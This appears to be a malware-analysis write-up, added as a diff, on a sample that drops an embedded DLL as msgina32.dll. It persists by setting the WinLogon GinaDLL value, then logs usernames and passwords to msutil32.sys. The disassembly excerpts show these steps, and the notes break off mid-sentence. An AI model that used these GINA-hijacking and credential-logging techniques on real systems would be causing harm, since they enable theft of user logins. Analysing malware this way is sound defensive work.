@@ -1,0 +1,108 @@
+1.The payload (in the form of an embedded PE file) is loaded from the resource section of the malicious PE, and then
+written to a file called msgina32.dll.
+
+
+Getting a reference to the embedded resource
+.text:004010FB
+.text:004010FB loc_4010FB:
+.text:004010FB mov     edx, [ebp+hResData]
+.text:004010FE push    edx             ; hResData
+.text:004010FF call    ds:LockResource
+.text:00401105 mov     [ebp+ptr_rsrc], eax
+.text:00401108 cmp     [ebp+ptr_rsrc], 0
+.text:0040110C jnz     short loc_401
+
+Calling fopen to write the payload to disk
+mov     ecx, [ebp+dwSize]
+mov     esi, [ebp+ptr_rsrc]
+mov     edi, [ebp+payload]
+mov     eax, ecx
+shr     ecx, 2
+rep movsd
+mov     ecx, eax
+and     ecx, 3
+rep movsb
+push    offset aWb      ; "wb"
+push    offset aMsgina32Dll_0 ; "msgina32.dll"
+call    _fopen
+add     esp, 8
+mov     [ebp+file], eax
+mov     ecx, [ebp+file]
+push    ecx             ; FILE *
+mov     edx, [ebp+dwSize]
+push    edx             ; size_t
+push    1               ; size_t
+mov     eax, [ebp+ptr_rsrc]  <-- writing the embedded payload to "msgina32.dll"
+push    eax             ; void *
+call    _fwrite
+add     esp, 10h
+mov     ecx, [ebp+file]
+push    ecx             ; FILE *
+call    _fclose
+add     esp, 4
+push    offset aDr      ; "DR\n"
+call    sub_401299
+add     esp, 4
+
+2. The malware achieves persistence by setting the value of GINA in WinLogon to the path of the malicious payload. GINA
+provides login support on pre Vista Windows. Quoting from MicroSoft, GINA is used to provide "customizable user identification and authentication procedures".
+
+.text:00401032
+.text:00401032 loc_401032:
+.text:00401032 mov     ecx, [ebp+cbData]  <-- size of malicious payload
+.text:00401035 push    ecx             ; cbData
+.text:00401036 mov     edx, [ebp+mal_filepath]  <-- filepath to malicious payload
+.text:00401039 push    edx             ; lpData
+.text:0040103A push    1               ; dwType
+.text:0040103C push    0               ; Reserved
+.text:0040103E push    offset ValueName ; "GinaDLL"
+.text:00401043 mov     eax, [ebp+phkResult]
+.text:00401046 push    eax             ; hKey
+.text:00401047 call    ds:RegSetValueExA
+.text:0040104D test    eax, eax
+.text:0040104F jz      short loc_401062
+
+3. The malware steals user creddentials by intercepting GINA 
+
+4. The malware writes the stolen credentials (username and password) to a file called "msutil32.sys", along with the 
+date and time accessed by associated account. Credentials are written to file during logout
+
+Writes user/password to file
+.text:10001570 mov     ecx, [esp+Format]     ; "UN %s DM %s PW %s OLD %s"
+.text:10001574 sub     esp, 854h
+.text:1000157A lea     eax, [esp+854h+Args]  ; user/password
+.text:10001581 lea     edx, [esp+854h+Dest]  
+.text:10001585 push    esi
+.text:10001586 push    eax             ; Args
+.text:10001587 push    ecx             ; Format 
+.text:10001588 push    800h            ; Count
+.text:1000158D push    edx             ; Dest
+.text:1000158E call    _vsnwprintf
+.text:10001593 push    offset Mode     ; Mode
+.text:10001598 push    offset Filename ; "msutil32.sys"
+.text:1000159D call    _wfopen   
+
+Writes the date and time to the file
+.text:100015AF lea     eax, [esp+858h+Dest]
+.text:100015B3 push    edi
+.text:100015B4 lea     ecx, [esp+85Ch+Buffer]
+.text:100015B8 push    eax
+.text:100015B9 push    ecx             ; Buffer
+.text:100015BA call    _wstrtime
+.text:100015BF add     esp, 4
+.text:100015C2 lea     edx, [esp+860h+var_828]
+.text:100015C6 push    eax
+.text:100015C7 push    edx             ; Buffer
+.text:100015C8 call    _wstrdate
+.text:100015CD add     esp, 4
+.text:100015D0 push    eax
+.text:100015D1 push    offset Format   ; "%s %s - %s "
+.text:100015D6 push    esi             ; File
+.text:100015D7 call    fwprintf
+.text:100015DC mov     edi, [esp+870h+dwMessageId]
+.text:100015E3 add     esp, 14h
+.text:100015E6 test    edi, edi
+.text:100015E8 jz      short loc_100016
+
+Additional notes:
+In order for the malware to replace 
